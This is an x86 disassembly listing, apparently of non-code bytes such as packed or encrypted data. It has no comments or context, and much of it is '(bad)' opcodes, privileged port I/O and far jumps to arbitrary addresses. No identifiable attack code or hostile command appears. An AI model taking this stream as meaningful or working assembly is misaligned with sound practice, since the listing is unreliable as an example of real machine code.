  413f5f:	repz aad 0x80
  413f62:	out    dx,eax
  413f63:	dec    ecx
  413f64:	sub    ecx,DWORD PTR [ecx]
  413f66:	pusha  
  413f67:	add    eax,0x9193dddb
  413f6c:	sti    
  413f6d:	pusha  
  413f6e:	push   ebx
  413f6f:	cmp    DWORD PTR [ebx+0x62601492],ecx
  413f75:	lahf   
  413f76:	out    dx,eax
  413f77:	imul   esi,DWORD PTR [ebx+eax*1+0xb8520a7],0xffffffaa
  413f7f:	aad    0x28
  413f81:	adc    al,0xb8
  413f83:	inc    ebx
  413f84:	cmp    BYTE PTR [eax+eax*8+0x7cd9223],cl
  413f8b:	ins    DWORD PTR es:[edi],dx
  413f8c:	imul   esp,DWORD PTR [esi+0x7],0x66
  413f90:	(bad)  
  413f91:	arpl   WORD PTR [ebp+0x319d9c23],bp
  413f97:	mov    dl,0x87
  413f99:	push   edi
  413f9a:	push   0x6e
  413f9c:	adc    dl,BYTE PTR [edx]
  413f9e:	ficomp DWORD PTR [edx+0x6b]
  413fa1:	jbe    0x413ff9
  413fa3:	ds (bad) 
  413fa6:	jmp    0x69f073f5
  413fab:	mov    ds:0x19037d84,eax
  413fb0:	and    bl,ah
  413fb2:	push   0x44
  413fb4:	adc    BYTE PTR ds:0x1a203a1c,dh
  413fba:	sbb    esp,DWORD PTR [ebx]
  413fbc:	pop    eax
  413fbd:	inc    BYTE PTR [edx+esi*2-0x47]
  413fc1:	pushf  
  413fc2:	inc    ecx
  413fc3:	and    al,0xa
  413fc5:	loopne 0x413fe7
  413fc7:	sbb    ebp,esp
  413fc9:	jb     0x414017
  413fcb:	ss ins BYTE PTR es:[edi],dx
  413fcd:	mov    esp,0xde4d1f3e
  413fd2:	out    dx,eax
  413fd3:	jnp    0x413fe6
  413fd5:	int3   
  413fd6:	out    dx,eax
  413fd7:	in     eax,0xd3
  413fd9:	nop
  413fda:	popa   
  413fdb:	inc    edx
  413fdc:	jno    0x414005
  413fde:	adc    BYTE PTR [eax+ebx*1+0x7c82f8f6],ah
  413fe5:	les    ecx,FWORD PTR [ebx+0x2b]
  413fe8:	outs   dx,DWORD PTR gs:[esi]
  413fea:	out    dx,al
  413feb:	pop    eax
  413fec:	jp     0x41406a
  413fee:	ja     0x414062
  413ff0:	jmp    FWORD PTR [edx]
  413ff2:	jp     0x413fc6
  413ff4:	mov    bh,0xab
  413ff6:	inc    esi
  413ff7:	jae    0x414049
  413ff9:	lds    eax,FWORD PTR [bp+di]
  413ffc:	pop    eax
  413ffd:	push   ebx
  413ffe:	repz arpl WORD PTR [esp+ebp*4+0x5ce9635f],sp
  414006:	sub    ecx,DWORD PTR [ebp-0x3080127c]
  41400c:	xchg   DWORD PTR ds:0x2315ee52,edi
  414012:	popa   
  414013:	sbb    ebx,edi
  414015:	es cmp al,0xb3
  414018:	sti    
  414019:	int3   
  41401a:	cld    
  41401b:	aas    
  41401c:	scas   al,BYTE PTR es:[edi]
  41401d:	cmp    eax,0x75b634a7
  414022:	add    DWORD PTR [ebp-0x3517d61f],ebp
  414028:	jns    0x41405c
  41402a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41402b:	pop    ebx
  41402c:	xchg   edx,eax
  41402d:	adc    al,0xf1
  41402f:	jne    0x414015
  414031:	sub    al,0x6
  414033:	int3   
  414034:	adc    BYTE PTR [esi+ebx*8-0x43a806e8],ah
  41403b:	dec    edi
  41403c:	cmp    ebx,esp
  41403e:	call   DWORD PTR [esp+esi*4]
  414041:	xchg   ebx,eax
  414042:	pop    esi
  414043:	pop    ebp
  414044:	fild   DWORD PTR [esi+0x19965f24]
  41404a:	adc    al,0x4f
  41404c:	bound  edx,QWORD PTR [eax+edx*1]
  41404f:	stos   BYTE PTR es:[edi],al
  414050:	xor    DWORD PTR [esi+0x5f],ebp
  414053:	leave  
  414054:	(bad)  
  414055:	std    
  414056:	xlat   BYTE PTR ds:[ebx]
  414057:	iret   
  414058:	das    
  414059:	lds    eax,FWORD PTR [ecx]
  41405b:	in     al,dx
  41405c:	mov    edi,0x9a4c3eec
  414061:	add    ebp,DWORD PTR [ecx]
  414063:	cli    
  414064:	out    dx,eax
  414065:	call   0x1d7a213d
  41406a:	popa   
  41406b:	mov    cl,0xe7
  41406d:	sar    ah,1
  41406f:	sbb    ebx,esp
  414071:	mov    BYTE PTR [esi+0xc04ba39],cl
  414077:	fdivr  st(4),st
  414079:	jle    0x4140ae
  41407b:	mov    eax,0xfd86bcb7
  414080:	sti    
  414081:	fwait
  414082:	add    BYTE PTR [ebx],0xad
  414085:	adc    esp,DWORD PTR [ebx+0x6fbfba51]
  41408b:	sub    eax,eax
  41408d:	dec    edi
  41408e:	or     al,BYTE PTR [edi]
  414090:	jnp    0x41404a
  414092:	aam    0x11
  414094:	dec    eax
  414095:	fcomi  st,st(3)
  414097:	lea    ebp,[ebx+0x36]
  41409a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41409b:	ret    
  41409c:	push   edx
  41409d:	sub    bh,BYTE PTR [edx]
  41409f:	dec    ecx
  4140a0:	fild   DWORD PTR [edx]
  4140a2:	es dec edi
  4140a4:	push   edi
  4140a5:	test   BYTE PTR [edi-0x28],ch
  4140a8:	and    eax,DWORD PTR [ebp-0x680083aa]
  4140ae:	mov    bh,0xa2
  4140b0:	outs   dx,BYTE PTR ds:[esi]
  4140b1:	mov    esi,0xf7c3539c
  4140b6:	and    DWORD PTR [ecx],edx
  4140b8:	call   0x556d:0xb0052ed0
  4140bf:	ret    
  4140c0:	test   DWORD PTR [edx],edi
  4140c2:	pop    esp
  4140c3:	cs dec esp
  4140c5:	sbb    dl,BYTE PTR [esi+0x61]
  4140c8:	mov    esp,0x2a3fbf18
  4140cd:	scas   eax,DWORD PTR es:[edi]
  4140ce:	pop    ebx
  4140cf:	in     eax,dx
  4140d0:	jl     0x41408e
  4140d2:	dec    esi
  4140d4:	dec    edx
  4140d5:	mov    bh,0x5e
  4140d7:	lock popa 
  4140d9:	pop    ss
  4140da:	cld    
  4140db:	xor    eax,DWORD PTR [ebp+esi*4-0x19386e2c]
  4140e2:	add    ecx,DWORD PTR cs:[ebx-0x191dcfdf]
  4140e9:	(bad)  
  4140eb:	inc    ecx
  4140ec:	cwde   
  4140ed:	popf   
  4140ee:	loope  0x414099
  4140f0:	fld    DWORD PTR [edx+edx*2+0x6e]
  4140f4:	inc    edi
  4140f5:	push   ds
  4140f6:	fisttp WORD PTR [esi+eax*2]
  4140f9:	ss out 0xe8,al
  4140fc:	dec    ebx
  4140fd:	aad    0x7f
  4140ff:	adc    dh,cl
  414101:	or     al,BYTE PTR [edi+0x26]
  414104:	or     BYTE PTR [esi+ebx*1+0x247aa5bf],bh
  41410b:	sbb    DWORD PTR [esi-0x73],ebp
  41410e:	fdivr  st,st(4)
  414110:	cld    
  414111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414112:	or     ecx,DWORD PTR [edx-0x1b]
  414115:	ror    DWORD PTR [eax-0x2a],0x50
  414119:	mov    cl,0x43
  41411b:	xchg   BYTE PTR [ebx+0xe5900af],dl
  414121:	clc    
  414122:	jae    0x414111
  414124:	inc    DWORD PTR [ebp-0xdf4c329]
  41412a:	std    
  41412b:	mov    eax,ds:0x24aa92e
  414130:	or     al,BYTE PTR [ebx]
  414132:	adc    BYTE PTR [eax+0x34386c95],ah
  414138:	ffree  st(6)
  41413a:	mov    esp,0x67e78aee
  41413f:	aad    0x74
  414141:	ror    bl,cl
  414143:	icebp  
  414144:	mov    WORD PTR [ebp-0x4b],ss
  414147:	loopne 0x41412d
  414149:	adc    ah,BYTE PTR [edx]
  41414b:	ret    0x94a5
  41414e:	sub    ebx,0xffffffcb
  414151:	(bad)  
  414153:	inc    ecx
  414154:	sub    BYTE PTR [edx],dl
  414156:	add    DWORD PTR [ecx+0x504db2ee],ecx
  41415c:	and    edx,DWORD PTR [ecx+0x5fa4dfa2]
  414162:	mov    bl,BYTE PTR [ecx+eiz*4-0x69]
  414166:	or     al,0xbe
  414168:	fxch   st(1)
  41416a:	fisub  WORD PTR [ebp+eiz*2+0x69f03ea9]
  414171:	addr16 mov edi,0xd8e573fa
  414177:	mov    ebx,0xa8e51a8f
  41417c:	xlat   BYTE PTR ds:[ebx]
  41417d:	mov    eax,0x19bfab20
  414182:	retf   0x8903
  414185:	das    
  414186:	pop    ebx
  414187:	mov    ds:0x947b412c,eax
  41418c:	fcomp  DWORD PTR [eax]
  41418e:	and    al,0x9a
  414190:	jnp    0x4141a5
  414192:	cmp    al,0xa1
  414194:	je     0x41412d
  414196:	mov    edx,0x534d5168
  41419b:	xor    DWORD PTR [esi-0x5e],ecx
  41419e:	mov    eax,0xd3dbfafe
  4141a3:	xor    DWORD PTR [ecx],ebx
  4141a5:	(bad)  
  4141a6:	sub    esp,DWORD PTR [eax-0x7aa6a45]
  4141ac:	cmp    ebx,DWORD PTR [ebx]
  4141ae:	mov    eax,esi
  4141b0:	xchg   edx,eax
  4141b1:	daa    
  4141b2:	jno    0x4141dd
  4141b4:	fiadd  DWORD PTR cs:[eax]
  4141b7:	xor    cl,BYTE PTR [edx]
  4141b9:	(bad)  
  4141bb:	loope  0x414229
  4141bd:	dec    edi
  4141be:	loope  0x4141b1
  4141c0:	ins    DWORD PTR es:[edi],dx
  4141c1:	data16 cmp al,0x5c
  4141c4:	sub    eax,0xd801778b
  4141c9:	jno    0x414177
  4141cb:	cmp    al,al
  4141cd:	xor    BYTE PTR fs:[edi-0x5f],al
  4141d1:	fmul   st,st(0)
  4141d3:	push   edi
  4141d4:	mov    bh,0x85
  4141d6:	cmp    DWORD PTR [edx],0xb97ff95c
  4141dc:	(bad)  
  4141de:	dec    edx
  4141df:	(bad)  
  4141e0:	jmp    0x72a6:0xdb0e5007
  4141e7:	data16 lahf 
  4141e9:	out    0xd8,eax
  4141eb:	in     eax,0x22
  4141ed:	mov    ecx,0xc0f91a5a
  4141f2:	mov    ds:0x158f93d3,eax
  4141f7:	ds mov eax,0x7e767c9c
  4141fd:	call   0xafb3:0x90688892
  414204:	dec    eax
  414205:	(bad)  [ecx]
  414207:	mov    ebx,DWORD PTR [ecx+0x5f]
  41420a:	dec    esi
  41420b:	repnz and eax,0x19e60f7
  414211:	xchg   BYTE PTR [edi-0x22e350a7],dl
  414217:	sti    
  414218:	loope  0x414290
  41421a:	xor    BYTE PTR [ebx+eax*1],al
  41421d:	push   ss
  41421e:	fcom   QWORD PTR [esi-0x56]
  414221:	mov    esp,0xd6a9968
  414226:	mov    ebp,0xed5ccfd0
  41422b:	scas   eax,DWORD PTR es:[edi]
  41422c:	test   dh,0x93
  41422f:	fmul   QWORD PTR [edi-0x1fc16002]
  414235:	fstp   QWORD PTR [edi]
  414237:	cli    
  414238:	mov    ah,0x4d
  41423a:	mov    edx,0x26840eba
  41423f:	pop    esi
  414240:	fnstsw WORD PTR [eax-0x55]
  414243:	inc    ebp
  414244:	jo     0xe6ab462b
  41424a:	jp     0x4141f4
  41424c:	shr    DWORD PTR [ebx*1-0x73bef005],1
  414253:	dec    ecx
  414254:	mov    ds,ebp
  414256:	fst    QWORD PTR [edx+0x2c]
  414259:	sar    DWORD PTR [ebx-0x37],0x45
  41425d:	fisttp WORD PTR [eax-0x6204020e]
  414263:	ins    DWORD PTR es:[edi],dx
  414264:	dec    esi
  414265:	jecxz  0x414209
  414267:	push   es
  414268:	shl    BYTE PTR [ebp+0x4251d5a4],cl
  41426e:	mov    edx,0x2c986bb1
  414273:	or     ah,dh
  414275:	mov    BYTE PTR [esi-0x5858ac01],bl
  41427b:	or     esp,0x497f2c69
  414281:	rol    ah,0x41
  414284:	test   eax,0x803ae0cf
  414289:	add    eax,DWORD PTR [ecx]
  41428b:	push   eax
  41428c:	push   ebp
  41428d:	out    0x36,eax
  41428f:	in     eax,dx
  414290:	stos   DWORD PTR es:[edi],eax
  414291:	addr16 repnz in al,dx
  414294:	inc    eax
  414295:	sbb    BYTE PTR [edx],al
  414297:	inc    edx
  414298:	daa    
  414299:	nop
  41429a:	sbb    ecx,DWORD PTR [esi+0x56e90b87]
  4142a0:	std    
  4142a1:	in     eax,dx
  4142a2:	add    ecx,DWORD PTR [eax+eax*4]
  4142a5:	pop    edi
  4142a6:	inc    eax
  4142a7:	nop
  4142a8:	push   0x2d
  4142aa:	inc    ebp
  4142ab:	mov    BYTE PTR [ebp+0x4c2847ed],dl
  4142b1:	inc    esp
  4142b2:	sub    cl,BYTE PTR [ecx]
  4142b4:	loopne 0x414303
  4142b6:	retf   
  4142b7:	scas   eax,DWORD PTR es:[edi]
  4142b8:	in     al,0xb4
  4142ba:	out    dx,eax
  4142bb:	cmp    al,0x7a
  4142bd:	jp     0x4142b9
  4142bf:	test   BYTE PTR [ebp+0x3b12ba4d],0xe0
  4142c6:	xor    al,0x6f
  4142c8:	or     al,BYTE PTR [eax+0x2e01d0a6]
  4142ce:	sub    DWORD PTR [eax+eax*1],eax
  4142d1:	cmp    esi,ecx
  4142d3:	lds    ebp,FWORD PTR [esi+0x777ac8cb]
  4142d9:	mov    al,0xb4
  4142db:	add    cl,BYTE PTR [edx-0x51]
  4142de:	sub    al,0xc5
  4142e0:	into   
  4142e1:	pop    edi
  4142e2:	ins    BYTE PTR es:[edi],dx
  4142e3:	sbb    al,0x50
  4142e5:	mov    edx,0x1dfd2ea8
  4142ea:	jmp    0xd57b:0x6db42e7b
  4142f1:	sub    ch,BYTE PTR [ebx+0x5b]
  4142f4:	mov    DWORD PTR [ebp+0x50d6f6c5],ebp
  4142fa:	push   es
  4142fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142fc:	sub    DWORD PTR ds:0x3a6ea47b,ecx
  414302:	sub    ch,al
  414304:	sbb    al,bh
  414306:	sub    BYTE PTR [esi-0x616cb550],bh
  41430c:	ret    
  41430d:	or     BYTE PTR [eax+esi*4-0x278b554a],bh
  414314:	call   0x2e2346db
  414319:	pop    edx
  41431a:	mov    dl,0x6f
  41431c:	mov    esp,0xf6bb0a3d
  414321:	push   es
  414322:	xchg   edi,eax
  414323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414324:	(bad)  
  414326:	repz pushf 
  414328:	inc    cx
  41432a:	jb     0x414392
  41432c:	addr16 push 0xfffffffe
  41432f:	(bad)  
  414330:	xlat   BYTE PTR ds:[ebx]
  414331:	or     edx,ebx
  414333:	add    al,0xba
  414335:	mov    ds:0xf1f778a,eax
  41433a:	push   esp
  41433b:	mov    al,ds:0x7169c99
  414340:	or     bh,bl
  414342:	sbb    ebp,DWORD PTR [ebx-0x5]
  414345:	add    al,0x97
  414347:	xchg   DWORD PTR [esi],edx
  414349:	mov    al,0xa1
  41434b:	imul   ebx,esi,0xffffffac
  41434e:	ror    BYTE PTR [edx],1
  414350:	imul   esi,DWORD PTR [ecx-0x5cc0ccb4],0x96615117
  41435a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41435b:	inc    edx
  41435c:	sbb    al,0xe
  41435e:	(bad)  
  414360:	jmp    0x1a8fc24c
  414365:	cld    
  414366:	inc    esi
  414367:	pusha  
  414368:	xor    BYTE PTR [esi-0x36],bl
  41436b:	cmp    al,0x52
  41436d:	or     BYTE PTR [ecx-0x40],ch
  414370:	dec    ebx
  414371:	gs (bad) 
  414373:	mul    DWORD PTR [edx]
  414375:	xor    al,0x8
  414377:	push   ebp
  414378:	push   0xffffffae
  41437a:	enter  0xd4df,0x4e
  41437e:	push   ecx
  41437f:	push   ecx
  414380:	and    eax,0xc1e4ec60
  414385:	sub    DWORD PTR ds:0xdc927d04,eax
  41438b:	out    0x28,al
  41438d:	(bad)  
  41438f:	cmp    ebx,ecx
  414391:	mov    BYTE PTR ds:0x61d0cb5e,al
  414397:	mov    esi,0x4712dd01
  41439c:	retf   0xad4d
  41439f:	outs   dx,DWORD PTR ds:[esi]
  4143a0:	call   0x77ec6098
  4143a5:	mov    bl,0x57
  4143a7:	retf   0x6382
  4143aa:	adc    ebx,DWORD PTR [esi]
  4143ac:	xchg   esi,eax
  4143ad:	pop    esp
  4143ae:	sub    ebx,DWORD PTR [eax+0x5e]
  4143b1:	inc    esi
  4143b2:	test   al,0x59
  4143b4:	(bad)  
  4143b5:	push   ecx
  4143b6:	lods   eax,DWORD PTR ds:[esi]
  4143b7:	sub    al,0x2
  4143b9:	pop    ss
  4143ba:	imul   esi,DWORD PTR [eax+0x6c],0xe178ddbe
  4143c1:	rcr    BYTE PTR [ecx],0x5e
  4143c4:	or     al,0x58
  4143c6:	dec    ebx
  4143c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143c8:	std    
  4143c9:	inc    ebp
  4143ca:	mov    ch,0x4e
  4143cc:	xchg   esi,eax
  4143cd:	or     DWORD PTR ds:0x68d60a79,esp
  4143d3:	enter  0xf2e8,0xda
  4143d7:	xchg   ecx,eax
  4143d8:	pushf  
  4143d9:	add    eax,DWORD PTR [esi+0x4d776e07]
  4143df:	call   0x5e4060bb
  4143e4:	inc    edi
  4143e5:	mov    al,es:0x9828034
  4143eb:	nop
  4143ec:	inc    ecx
  4143ed:	push   ecx
  4143ee:	sub    DWORD PTR [edx+0x2e],esp
  4143f1:	or     DWORD PTR [ebp+0x3c],0x7d1200a
  4143f8:	jecxz  0x4143d3
  4143fa:	adc    dl,ch
  4143fc:	dec    BYTE PTR [eax-0x4f67eea1]
  414402:	stc    
  414403:	jnp    0x41443c
  414405:	xchg   BYTE PTR [ebp-0x98332d0],bl
  41440b:	imul   ebp,DWORD PTR [edx+0x63],0xffffff8d
  41440f:	sub    DWORD PTR [eax],esi
  414411:	mov    dl,0x7d
  414413:	xchg   ebp,eax
  414414:	hlt    
  414415:	sbb    BYTE PTR [eax],bl
  414417:	retf   0x618b
  41441a:	mov    ah,0xdb
  41441c:	jmp    0x56e2dda5
  414421:	dec    ebp
  414422:	pop    edi
  414423:	mov    edi,0xec23ce12
  414428:	pop    ss
  414429:	xchg   esi,eax
  41442a:	int    0x11
  41442c:	ds test al,0x97
  41442f:	dec    eax
  414430:	out    0x91,eax
  414432:	aad    0xcc
  414434:	or     BYTE PTR [ebp+ebp*8+0x1605942a],dh
  41443b:	mov    ss,esi
  41443d:	loop   0x414466
  41443f:	add    eax,DWORD PTR [ecx-0x73230253]
  414445:	ds pusha 
  414447:	jmp    0xeb6f35db
  41444c:	sub    ebx,ebp
  41444e:	and    dh,BYTE PTR [edx+0x2e]
  414451:	repz sub DWORD PTR [edi],0x78b67e13
  414458:	jae    0x4143f4
  41445a:	mov    cs,WORD PTR [eax]
  41445c:	aad    0x50
  41445e:	push   es
  41445f:	mov    bl,0xfd
  414461:	out    dx,eax
  414462:	call   FWORD PTR [ebp*8-0xa3ef3dd]
  414469:	pop    ebp
  41446a:	enter  0x2f3f,0xa6
  41446e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41446f:	je     0x414428
  414471:	mov    dh,0x20
  414473:	mov    DWORD PTR ds:0xa7ee237c,0x657fe35e
  41447d:	and    al,0xa9
  41447f:	scas   eax,DWORD PTR es:[edi]
  414480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414481:	pop    edx
  414482:	ror    BYTE PTR [ebp+0xbdbb4ad],0x50
  414489:	and    al,0xb1
  41448b:	pop    es
  41448c:	cmp    eax,0x556a7d26
  414491:	cld    
  414492:	ins    DWORD PTR es:[edi],dx
  414493:	sub    BYTE PTR [ebx+0x4ad7ad9f],al
  414499:	fisubr WORD PTR [ebp-0x7]
  41449c:	neg    DWORD PTR [edx]
  41449e:	jmp    0x722a7b14
  4144a3:	inc    eax
  4144a4:	repz mov ebx,0x57891faa
  4144aa:	sbb    bh,bl
  4144ac:	outs   dx,DWORD PTR ds:[esi]
  4144ad:	pop    ebx
  4144ae:	icebp  
  4144af:	sub    DWORD PTR [eax],0xf9b4a327
  4144b5:	pop    edx
  4144b6:	jge    0x41452a
  4144b8:	xchg   dl,bh
  4144ba:	mov    edx,0x3ca268b0
  4144bf:	and    eax,0xbc33ef19
  4144c4:	(bad)  [edx]
  4144c6:	test   BYTE PTR [eax-0x6eee1864],al
  4144cc:	jbe    0x4144c3
  4144ce:	shl    DWORD PTR [ebx+0x38bb3a6],cl
  4144d4:	xchg   ecx,eax
  4144d5:	rol    BYTE PTR [esi-0x67],0xc8
  4144d9:	mov    ah,0xb1
  4144db:	int    0x79
  4144dd:	cmp    ecx,edx
  4144df:	dec    esp
  4144e0:	adc    eax,0x52bc31f5
  4144e5:	pop    esp
  4144e6:	inc    BYTE PTR [edi-0x18]
  4144e9:	rol    esp,1
  4144eb:	imul   edx,DWORD PTR [esi],0xffffffa6
  4144ee:	mov    bh,0xfd
  4144f0:	retf   0xb8c3
  4144f3:	xor    bl,BYTE PTR [esi+0x6c546e19]
  4144f9:	xchg   ebx,eax
  4144fa:	mov    esi,0x2942989
  4144ff:	in     eax,0x48
  414501:	cwde   
  414502:	out    0xc4,al
  414504:	mov    ch,0x12
  414506:	lods   eax,DWORD PTR ds:[esi]
  414507:	add    DWORD PTR ds:[ecx],eax
  41450a:	xchg   ecx,eax
  41450b:	icebp  
  41450c:	out    dx,al
  41450d:	or     DWORD PTR [eax-0x69],ecx
  414510:	adc    al,0x5d
  414512:	mov    ecx,0xba735e26
  414517:	lock int 0xfe
  41451a:	test   eax,0xbb733ae8
  41451f:	add    eax,0x44d6a9ad
  414524:	data16 lahf 
  414526:	xlat   BYTE PTR ds:[ebx]
  414527:	lods   eax,DWORD PTR ds:[esi]
  414528:	cmp    dl,BYTE PTR [eax+0x2bfff56f]
  41452e:	unpckhps xmm0,xmm7
  414531:	stos   DWORD PTR es:[edi],eax
  414532:	dec    ebp
  414533:	xor    eax,0x5c1bf954
  414538:	and    dl,bl
  41453a:	mov    esi,0x560209cb
  41453f:	lock lea ecx,[esi+esi*8-0x7]
  414544:	and    ch,BYTE PTR [esi+ecx*4+0x11]
  414548:	sub    bl,BYTE PTR [edi+0x4f]
  41454b:	div    BYTE PTR [ecx+0x79d5d930]
  414551:	jae    0x4144e6
  414553:	aaa    
  414554:	xchg   BYTE PTR [ebp-0x15],dl
  414557:	mov    ah,0xbf
  414559:	add    DWORD PTR [edx],0xfffffff0
  41455c:	les    ebp,FWORD PTR [eax+0x47]
  41455f:	xchg   ecx,eax
  414560:	mov    bl,BYTE PTR cs:[edx+0x5a89fa17]
  414567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414568:	jbe    0x414569
  41456a:	stos   DWORD PTR es:[edi],eax
  41456b:	arpl   ax,cx
  41456d:	gs lahf 
  41456f:	ret    0x6193
  414572:	lods   al,BYTE PTR ds:[esi]
  414573:	xchg   esp,eax
  414574:	mov    BYTE PTR [edi],dl
  414576:	dec    esp
  414577:	cli    
  414578:	loop   0x414597
  41457a:	clc    
  41457b:	sub    eax,0x21371ffd
  414580:	mov    cl,BYTE PTR [ebx+0x3c]
  414583:	pop    ecx
  414584:	adc    eax,0xf4303152
  414589:	sub    al,0x52
  41458b:	sub    eax,DWORD PTR [si]
  41458e:	push   esi
  41458f:	pop    eax
  414590:	sbb    BYTE PTR [ecx],dl
  414592:	scas   eax,DWORD PTR es:[edi]
  414593:	and    eax,0x30d86f81
  414598:	ds pop ebx
  41459a:	nop
  41459b:	push   esi
  41459c:	fwait
  41459d:	jb     0x414549
  41459f:	or     bh,cl
  4145a1:	cld    
  4145a2:	test   esi,eax
  4145a4:	cwde   
  4145a5:	inc    ecx
  4145a6:	jmp    0x4145a0
  4145a8:	scas   al,BYTE PTR es:[edi]
  4145a9:	sub    eax,0x42dd487d
  4145ae:	aam    0xa9
  4145b0:	xchg   esi,eax
  4145b1:	imul   edi,DWORD PTR [edx+0x56b1009],0xffffff85
  4145b8:	iret   
  4145b9:	into   
  4145ba:	sti    
  4145bb:	cmp    al,0xca
  4145bd:	or     bh,BYTE PTR [ebx+0x1f]
  4145c0:	xor    eax,0x789be67b
  4145c5:	fist   DWORD PTR [ecx]
  4145c7:	jle    0x4145c7
  4145c9:	fdivr  DWORD PTR [esi+0x7f]
  4145cc:	fwait
  4145cd:	push   edx
  4145ce:	popf   
  4145cf:	dec    ecx
  4145d0:	cmp    ah,BYTE PTR [esi+edi*2+0x53]
  4145d4:	add    eax,0xc77e399e
  4145d9:	xchg   ecx,eax
  4145da:	add    al,0x76
  4145dc:	pop    ds
  4145dd:	and    edi,ecx
  4145df:	add    BYTE PTR [eax-0x2f5ddc96],0x2a
  4145e6:	lods   eax,DWORD PTR ds:[esi]
  4145e7:	shl    DWORD PTR [edx+0x2d],cl
  4145ea:	jecxz  0x4145aa
  4145ec:	repnz xor DWORD PTR [ecx+0x4d],ebp
  4145f0:	mov    bh,0xcc
  4145f2:	bound  eax,QWORD PTR [ebx]
  4145f4:	icebp  
  4145f5:	mov    ah,0x9f
  4145f7:	pusha  
  4145f8:	push   edi
  4145f9:	sti    
  4145fa:	stos   BYTE PTR es:[edi],al
  4145fb:	cmp    DWORD PTR [ebx-0x6a17b485],ebx
  414601:	leave  
  414602:	pop    es
  414603:	sbb    eax,0x876ba7da
  414608:	scas   al,BYTE PTR es:[edi]
  414609:	js     0x41462c
  41460b:	enter  0x54cf,0xf9
  41460f:	jmp    0x4145aa
  414611:	mov    al,ds:0x292ad55
  414616:	xchg   ecx,eax
  414617:	xlat   BYTE PTR ds:[ebx]
  414618:	test   DWORD PTR [ecx+ecx*2+0x3effa345],esp
  41461f:	int3   
  414620:	mov    fs,WORD PTR [esi]
  414622:	mov    eax,ds:0xc5a652a8
  414627:	inc    edx
  414628:	fsubrp st(4),st
  41462a:	enter  0xe6c3,0x5f
  41462e:	pop    edx
  41462f:	test   DWORD PTR [eax],ecx
  414631:	icebp  
  414632:	jno    0x414670
  414634:	std    
  414635:	jge    0x41463b
  414637:	mov    ecx,0x7181cd09
  41463c:	jnp    0x414633
  41463e:	inc    ebx
  41463f:	sub    eax,0x69c17c05
  414644:	inc    esi
  414645:	iret   
  414646:	jmp    DWORD PTR [ebx]
  414648:	dec    ebp
  414649:	rcr    BYTE PTR [edx],cl
  41464b:	adc    BYTE PTR ds:0xe5776d52,0xa8
  414652:	sbb    esp,esp
  414654:	sahf   
  414655:	sar    eax,cl
  414657:	push   ss
  414658:	mov    DWORD PTR [ebp-0x1],ebx
  41465b:	stos   DWORD PTR es:[edi],eax
  41465c:	and    ecx,esp
  41465e:	ss sub esi,esp
  414661:	sbb    dh,ch
  414663:	loopne 0x414667
  414665:	push   0x23
  414667:	popf   
  414668:	pop    esp
  414669:	icebp  
  41466a:	and    eax,0xa5e39538
  41466f:	cmp    BYTE PTR es:[ecx+edx*8-0x68],bl
  414674:	sbb    BYTE PTR [ebp+0x63c3f11e],al
  41467a:	sti    
  41467b:	xor    al,BYTE PTR [edi]
  41467d:	lods   eax,DWORD PTR ds:[esi]
  41467e:	jmp    0x41466f
  414680:	jl     0x41464c
  414682:	loope  0x414673
  414684:	clc    
  414685:	clc    
  414686:	std    
  414687:	adc    eax,0x650ca9b4
  41468c:	stos   BYTE PTR es:[edi],al
  41468d:	or     edx,DWORD PTR [edx]
  41468f:	adc    esi,ebp
  414691:	call   0xc79ca869
  414696:	fild   WORD PTR [edx-0x73]
  414699:	mov    cl,0x3b
  41469b:	mov    edi,0xec87e3b7
  4146a0:	mov    ds:0x50c4e4e,al
  4146a5:	sbb    al,0xc1
  4146a7:	sti    
  4146a8:	ins    DWORD PTR es:[edi],dx
  4146a9:	mov    ds:0x9641798e,eax
  4146ae:	pop    ebx
  4146af:	shl    DWORD PTR [esi+0x23b36bcb],cl
  4146b5:	je     0x414700
  4146b7:	das    
  4146b8:	push   edx
  4146b9:	add    eax,0xa09d0d82
  4146be:	retf   
  4146bf:	call   0x8d49:0xb21deddb
  4146c6:	fnstcw WORD PTR [edi+0x3006f51f]
  4146cc:	pushf  
  4146cd:	in     eax,dx
  4146ce:	(bad)  
  4146d0:	xchg   esi,eax
  4146d1:	mov    dl,0xbe
  4146d3:	add    ecx,DWORD PTR [edx+0x3ac68ef]
  4146d9:	retf   0x961f
  4146dc:	mov    edx,0x67ac7c9a
  4146e1:	adc    edi,DWORD PTR [esi+0x71]
  4146e4:	daa    
  4146e5:	mov    ah,0x88
  4146e7:	fs and ebx,esp
  4146ea:	adc    edi,DWORD PTR [eax-0x5]
  4146ed:	fiadd  WORD PTR [esi-0x2dbff6c8]
  4146f3:	pushf  
  4146f4:	xor    eax,0x58389160
  4146f9:	add    dl,cl
  4146fb:	jmp    FWORD PTR [ebx]
  4146fd:	clc    
  4146fe:	fcom   st(1)
  414700:	test   bl,0x7f
  414703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414704:	bound  ebp,QWORD PTR ss:[eax]
  414707:	(bad)  
  414708:	in     eax,dx
  414709:	rcr    BYTE PTR [eax+edx*8-0x26],0x66
  41470e:	fmul   DWORD PTR [esi+0x3de24d4]
  414714:	sub    dh,BYTE PTR [ebx+0x57]
  414717:	ds push esi
  414719:	xlat   BYTE PTR ds:[ebx]
  41471a:	jbe    0x4146e5
  41471c:	data16 and BYTE PTR [edi-0x43afe6b7],al
  414723:	and    eax,eax
  414725:	pop    edx
  414726:	int3   
  414727:	or     al,0xc8
  414729:	xchg   DWORD PTR [ecx],edi
  41472b:	push   ebp
  41472c:	adc    DWORD PTR [ebx-0x2778de4],eax
  414732:	shl    cl,1
  414734:	and    al,0x9f
  414736:	out    0x2a,eax
  414738:	and    al,0xaa
  41473a:	or     eax,0xc0a245f0
  41473f:	lds    edi,FWORD PTR [esi]
  414741:	out    dx,eax
  414742:	add    eax,0xcc290643
  414747:	jmp    0xa1e78df4
  41474c:	repz iret 
  41474e:	cmp    al,0xf4
  414750:	push   esi
